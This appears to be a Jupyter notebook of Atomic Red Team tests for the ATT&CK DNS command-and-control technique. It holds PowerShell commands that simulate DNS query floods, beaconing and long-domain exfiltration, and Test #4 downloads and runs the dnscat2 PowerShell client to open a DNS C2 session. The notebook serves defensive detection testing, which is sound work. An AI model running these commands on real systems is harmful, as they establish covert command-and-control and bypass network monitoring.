{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "5237f032",
   "metadata": {},
   "source": "# T1071.004 - DNS\nAdversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) "
  },
  {
   "cell_type": "markdown",
   "id": "77d9a743",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "58aae01b",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - DNS Large Query Volume",
    "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nfor($i=0; $i -le 1000; $i++) { Resolve-DnsName -type \"TXT\" \"atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io\" -QuickTimeout}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a6027639",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1071.004 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "debe1dea",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - DNS Regular Beaconing",
    "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-Location PathToAtomicsFolder\n.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "27be3f22",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1071.004 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "11a87aef",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - DNS Long Domain Query",
    "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-Location PathToAtomicsFolder\n.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "510da1c4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1071.004 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "e5867fb4",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - DNS C2",
    "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nIEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0c31e270",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1071.004 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "df873301",
   "metadata": {},
   "source": "## Detection\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for DNS traffic to/from known-bad or suspicious domains."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}